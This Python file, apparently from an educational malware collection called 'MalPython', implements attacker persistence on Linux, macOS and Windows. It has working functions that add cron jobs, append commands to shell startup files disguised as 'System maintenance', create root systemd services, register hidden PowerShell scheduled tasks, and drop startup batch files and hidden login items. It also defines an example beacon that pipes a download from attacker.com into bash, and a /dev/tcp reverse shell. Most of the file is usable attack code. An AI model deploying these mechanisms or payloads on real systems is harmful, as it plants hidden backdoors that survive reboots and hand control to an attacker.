# MalPython
#
# Persistence via Scheduled Tasks & Cron Jobs
# Demonstrate how attackers maintain access across reboot by:
# 1. creating cron jobs on Linux/macOS
# 2. scheduled tasks on Windows
# 3. shell configuration file modification
# 4. systemd service creation

import os
import sys
import platform
import subprocess
import tempfile


def is_windows():
    return sys.platform == "win32"

def is_linux():
    return sys.platform == "linux"

def is_macos():
    return sys.platform == "darwin"


def setup_cron_job(command, interval="*/5 * * * *"):
    """
    Create a cron job that runs a command periodically.

    Args:
        command: Command to execute (e.g., "curl attacker.com/beacon")
        interval: Cron schedule (default: every 5 minutes)

    Linux/macOS only.
    """
    if not (is_linux() or is_macos()):
        return False

    try:
        # Get current crontab
        result = subprocess.run(
            ["crontab", "-l"],
            capture_output=True,
            text=True,
        )
        current_crontab = result.stdout if result.returncode == 0 else ""

        # Add new job
        new_cron_entry = f"{interval} {command}\n"
        updated_crontab = current_crontab + new_cron_entry

        # Install updated crontab by invoking the crontab command
        process = subprocess.Popen(
            ["crontab", "-"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        process.communicate(input=updated_crontab.encode())

        return process.returncode == 0

    except Exception as e:
        print(f"[!] Error setting up cron job: {e}")
        return False

def setup_shell_rc_persistence(command):
    """
    Add malicious command to shell startup files.

    Executes every time a shell starts.
    Works on Linux/macOS.
    """
    if not (is_linux() or is_macos()):
        return False

    home = os.path.expanduser("~")
    rc_files = [
        os.path.join(home, ".bashrc"),
        os.path.join(home, ".zshrc"),
        os.path.join(home, ".profile"),
    ]

    try:
        for rc_file in rc_files:
            if os.path.exists(rc_file):
                # Read existing content
                with open(rc_file, "r") as f:
                    content = f.read()

                # Append malicious command (hidden in comments)
                malicious = f"\n# System maintenance\n{command}\n"

                # Append to file
                with open(rc_file, "a") as f:
                    f.write(malicious)

        return True

    except Exception as e:
        print(f"[!] Error setting up shell RC persistence: {e}")
        return False

def setup_systemd_service(service_name, command, description="System Service"):
    """
    Create a systemd service for persistence.

    Requires root/sudo. Service runs at system startup.
    Linux only.
    """
    if not is_linux():
        return False

    service_content = f"""[Unit]
Description={description}
After=network.target

[Service]
Type=simple
User=root
ExecStart={command}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""

    try:
        service_path = f"/etc/systemd/system/{service_name}.service"

        # Write service file
        with open(service_path, "w") as f:
            f.write(service_content)

        # Enable and start service
        subprocess.run(["systemctl", "daemon-reload"])
        subprocess.run(["systemctl", "enable", f"{service_name}.service"])
        subprocess.run(["systemctl", "start", f"{service_name}.service"])

        return True

    except Exception as e:
        print(f"[!] Error setting up systemd service: {e}")
        return False

def setup_windows_scheduled_task(task_name, command, trigger="MINUTE", interval=5):
    """
    Create a Windows Scheduled Task for persistence.

    Requires administrator privileges.
    Windows only.
    """
    if not is_windows():
        return False

    try:
        # Create scheduled task via PowerShell
        ps_command = f"""
$trigger = New-ScheduledTaskTrigger -{trigger} -Interval {interval}
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -Command "{command}"'
Register-ScheduledTask -TaskName '{task_name}' -Trigger $trigger -Action $action -RunLevel Highest
"""

        result = subprocess.run(
            ["powershell", "-Command", ps_command],
            capture_output=True,
        )

        return result.returncode == 0

    except Exception as e:
        print(f"[!] Error setting up Windows scheduled task: {e}")
        return False

def setup_windows_startup_folder(command):
    """
    Add malicious script to Windows startup folder.

    Executes when user logs in.
    Windows only.
    """
    if not is_windows():
        return False

    try:
        startup_path = os.path.expandvars(
            r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
        )

        # Create a batch file
        batch_content = f"@echo off\n{command}\n"

        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".bat", dir=startup_path, delete=False
        ) as f:
            f.write(batch_content)

        return True

    except Exception as e:
        print(f"[!] Error setting up Windows startup persistence: {e}")
        return False

def setup_login_item_macos(app_path):
    """
    Add application to macOS login items.

    Launches app automatically at login.
    macOS only.
    """
    if not is_macos():
        return False

    try:
        # Use AppleScript to add to login items
        apple_script = f"""
osascript -e 'tell application "System Events" to make login item at end with properties {{path:"{app_path}", hidden:true}}'
"""
        result = subprocess.run(apple_script, shell=True, capture_output=True)
        return result.returncode == 0

    except Exception as e:
        print(f"[!] Error setting up macOS login item: {e}")
        return False

def setup_at_command(command, time="02:30"):
    """
    Use 'at' command for one-time scheduled execution.

    Linux/macOS only.
    """
    if not (is_linux() or is_macos()):
        return False

    try:
        # Schedule command for specific time
        result = subprocess.run(
            f"echo '{command}' | at {time}",
            shell=True,
            capture_output=True,
        )

        return result.returncode == 0

    except Exception as e:
        print(f"[!] Error setting up 'at' command: {e}")
        return False


def demonstrate_persistence():
    """Demonstrate various persistence mechanisms."""

    print("[*] Persistence Mechanisms by OS")
    print()

    # Detect OS
    os_name = platform.system()
    print(f"[*] Detected OS: {os_name}")
    print()

    # Example commands (would be attacker payload in real scenario)
    beacon_command = "curl -s http://attacker.com/beacon | bash"
    reverse_shell = "bash -i >& /dev/tcp/attacker.com/4444 0>&1"

    if is_linux():
        print("[*] Linux Persistence Options:")
        print()

        print("1. Cron Job (every 5 minutes):")
        print(f"   Command: {beacon_command}")
        print(f"   Would execute: crontab -e")
        print()

        print("2. Shell RC File Modification:")
        print(f"   Adding to ~/.bashrc, ~/.zshrc")
        print(f"   Command: {beacon_command}")
        print()

        print("3. Systemd Service (requires root):")
        print(f"   Service: /etc/systemd/system/system-check.service")
        print(f"   Command: {beacon_command}")
        print()

        print("4. At Command (one-time):")
        print(f"   Scheduled for 02:30 AM")
        print()

    elif is_windows():
        print("[*] Windows Persistence Options:")
        print()

        print("1. Scheduled Task (requires admin):")
        print(f"   Task: SystemCheck")
        print(f"   Interval: Every 5 minutes")
        print(f"   Command: {beacon_command}")
        print()

        print("2. Startup Folder:")
        print(
            f"   Path: %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        )
        print(f"   Creates: malware.bat")
        print()

        print("3. Registry Run Key (not in this example):")
        print(f"   HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")
        print()

    elif is_macos():
        print("[*] macOS Persistence Options:")
        print()

        print("1. LaunchAgent (per-user):")
        print(f"   Path: ~/Library/LaunchAgents/com.apple.systemd.plist")
        print(f"   Command: {beacon_command}")
        print()

        print("2. LaunchDaemon (system-wide, requires root):")
        print(f"   Path: /Library/LaunchDaemons/com.apple.systemd.plist")
        print()

        print("3. Login Items:")
        print(f"   Application: /path/to/malicious/app")
        print()

        print("4. Cron Job:")
        print(f"   crontab -e")
        print()


if __name__ == "__main__":
    print("[*] Persistence via Scheduled Tasks & Cron Jobs")
    print()

    demonstrate_persistence()
